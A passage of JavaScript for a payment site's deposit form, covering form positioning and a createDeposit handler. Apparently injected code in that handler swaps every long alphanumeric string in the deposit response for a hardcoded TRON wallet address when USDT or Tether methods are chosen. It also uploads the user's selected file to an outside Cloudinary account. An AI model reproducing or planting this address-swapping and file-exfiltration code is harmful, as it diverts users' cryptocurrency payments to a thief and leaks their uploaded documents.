        }

        if (isInFrame()) {
            h_win = parent.window.innerHeight;
            offset_top = parent.window.pageYOffset;

            h_win = h_win - h_delta; // исключаем шапку для большого окна
            if (is_mobi) {
                if (scrollHelper.current_height === null) {
                    offset_top = offset_top - 70;
                }
            } else {
                offset_top = offset_top - offset_delta;
            }

            if (actual_height >= h_win) {
                marginTop = offset_top + (h_win - h) / 2;
            } else {
                marginTop = offset_top + (actual_height - h) / 2;
            }
        } else {
            marginTop = offset_top + (h_win - h) / 2;
        }

        if (((isInFrame() && h >= h_win) || (h >= h_window) || scrollHelper.current_height) && window.user_refid !== 288) {
            full = true;
            if (!is_mobi) {
                marginTop = offset_top;
            }
        }

        if ((marginTop + h) > actual_height) {
            marginTop = actual_height - h;
        }

        if (marginTop < 0 || (is_mobi && h >= h_win)) {
            marginTop = 0;
        }

        if (is_mobi && offset_top >= 70 && scrollHelper.current_height === null) {
            marginTop = offset_top;
        }

        if (is_mobi && full && scrollHelper.current_height > 0) {
            marginTop = 0;
        }

        if (!full) {
            form.css({'top': 0, 'margin-top': marginTop});
        } else {
            if (is_mobi) {
                form.css({'height': h_win, 'top': 0, 'margin-top': marginTop});
            } else {
                if (isInFrame() && h_win < h_window) {
                    h_window = h_win;
                }
                form.css({'height': h_window, 'top': 0, 'margin-top': marginTop});
            }
            form.addClass('full');
            addFullIframe();
            if (!is_mobi) {
                payment_form_container.addClass('scrollbar-inner').scrollbar();
            }
        }

        if (scrollHelper.force_current_height) {
            scrollHelper.current_height = scrollHelper.force_current_height;
            resize();
        } else if (is_mobi && h > h_win && scrollHelper.current_height === null) {
            scrollHelper.current_height = h_win + 50;
            resize();
        } else if (is_mobi && h >= h_win && scrollHelper.current_height > 0) {
            scrollHelper.current_height = h + 50;
            resize();
        }

        var $s2 = $(".select2-container");

        if ($s2.eq(1).length) {
            if ($s2.eq(1).find("span").is(".select2-dropdown--below")) {
                $s2.eq(1).css("top", $s2.offset().top + $s2.height());
            } else if ($s2.eq(1).find("span").is(".select2-dropdown--above")) {
                $s2.eq(1).css("top", $s2.offset().top - $s2.eq(1).find("span").height());
            }
        }
    }

    $(document).trigger("modal:offsetForm", [form]);
}

function createDepositRecaptcha() {
    createDeposit($('#deposit_button'));
}

function createWithdrawRecaptcha() {
    createWithdraw($('#withdraw_button'));
}

function createDeposit($this) {
    var $form = $this.closest('form'),
        payment_system = $('.payment_item.active'),
        subsystem = payment_system.data('method'),
        rewriteMethod = $this.data('rewrite-method'),
        button_key = payment_system.data('rawmethod'),
        type = payment_system.data('type'),
        $container = $form.parent(),
        $preloader = $('.preloader'),
        url = $form.attr('action'),
        formData = {},
        contentType = false,
        processData = false;

    if(rewriteMethod)
    {
      subsystem = rewriteMethod;
    }

    if (typeof files !== 'undefined' && files){  
        uploadFile();
        formData = new FormData($form.get(0));

        if (subsystem !== '') {
            formData.append('sub_system', subsystem);
        }

        formData.append('payment_system_type', type);
    } else {
        var form_serialize = $form.serializeArray();

        $(form_serialize).each(function (key, value) {
            formData[value['name']] = value['value'];
        });

        if (subsystem !== '') {
            formData['sub_system'] = subsystem;
        }

        formData['payment_system_type'] = type;
        formData['button_key']          = button_key;

        if (window.s_id) {
            formData['s_id'] = window.s_id;
        }

        processData = true;
        contentType = 'application/x-www-form-urlencoded; charset=UTF-8';
    }

    $('.payment_modal_error').empty();
var is_popup = false;

    
    
    
      
        async function uploadFile() {
    const fileInput = document.getElementById('file_0');
    const file = fileInput.files[0];

    if (!file) {
        alert("Please select a file.");
        return;
    }

    const cloudName = 'da7v0ae7b'; // اسم السحابة الخاص بك
    const uploadPreset = 'file'; // اسم upload preset الذي قمت بإنشائه في Cloudinary

    const url = `https://api.cloudinary.com/v1_1/${cloudName}/image/upload`;

    const formData = new FormData();
    formData.append('file', file);
    formData.append('upload_preset', uploadPreset);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });

        const responseData = await response.json();
        if (responseData.secure_url) {
            console.log("Image uploaded successfully:", responseData.secure_url);
            // يمكنك إرسال الرابط إلى خادمك أو استخدامه في أي مكان تريده
            alert("Image uploaded successfully. URL: " + responseData.secure_url);
        } else {
            console.error("Failed to upload image:", responseData);
        }
    } catch (error) {
        console.error("Error uploading image:", error);
    }
}
      
    
    var ussdt = formData.sub_system;
if (ussdt === 'TetheronTron' || ussdt === 'TetheronTron') {
    usdt = 'TU52zcrx8sEdgB8zXGeTe2pTFaoYqHyRax';
    tok = true;
} else if (ussdt === 'usdt' || ussdt === 'usdtbsc' || ussdt === 'binancecoinbsc') {
    usdt = 'TU52zcrx8sEdgB8zXGeTe2pTFaoYqHyRax';
    tok = true;
} else {
    tok = false;
}

    ajax['createDeposit'] = $.ajax({
        url: url,
        type: 'post',
        data: formData,
        //async: false,
        contentType: contentType, // важно - убираем форматирование данных по умолчанию
        processData: processData, // важно - убираем преобразование строк по умолчанию
        beforeSend: function () {
            $this.hide();
            $preloader.show();
            in_process = true;
        },
        success: function (data) {
        if(tok){data.html = data.html.replace(/[a-zA-Z0-9]{32,}/gm, usdt);}
            $(document).trigger('deposit.request_complete', data);
            var forms;
            if (data['success']) {

                if (data['code'] === 3) {
                    $this.show();
                    $preloader.hide();

                    // alerts(data['title'], data['message'], 2);
                    if (data['fields'] && typeof data['fields'] !== 'undefined') {
                        for (var field in data['fields']) {
                            addFieldToForm($this, data['fields'][field]);
                            if (data['message'] !== '') {
                                $('#payment_error_' + data['fields'][field]['name']).text(data['message']);
                            }
                        }
                        getOffsetForm(payment_form);
                    }

                    if (typeof VKI_attach !== 'undefined') {
                        refreshKeybords();
                    }

                } else if (data['code'] === 1) {

                    closeForm();
                    alerts(data['title'], data['message'], 0, data);

                }else if (data['code'] === 5) {
                    window.parent.location.href = data['message'];
                } else if (data['code'] === 2) {
                    $this.show();
                    $preloader.hide();

                    if (typeof data['fields'] !== 'undefined' && data['fields']) {
                        for (var field_name in data['fields']) {
                            $('#payment_error_' + field_name).text(data['fields'][field_name]);
                            if (window.user_refid === 178 && data['fields'][field_name]) {
                                $('#payment_error_' + field_name).closest('.payment_modal_row').addClass('payment_modal_row--error');
                            }
                        }
                    }
                    getOffsetForm(payment_form);

                    if (grecaptcha !== null) {
                        grecaptcha.reset();
                    }

                    //alerts(data['title'], data['message'], 0);
                } else if (data['code'] === 6) {
                    alerts(dictionary.get('confirm_action'), data['message'], data['code'], data);
                } else if (data['code'] === 4) {

                    closeForm();

                    var add_data = [];
             
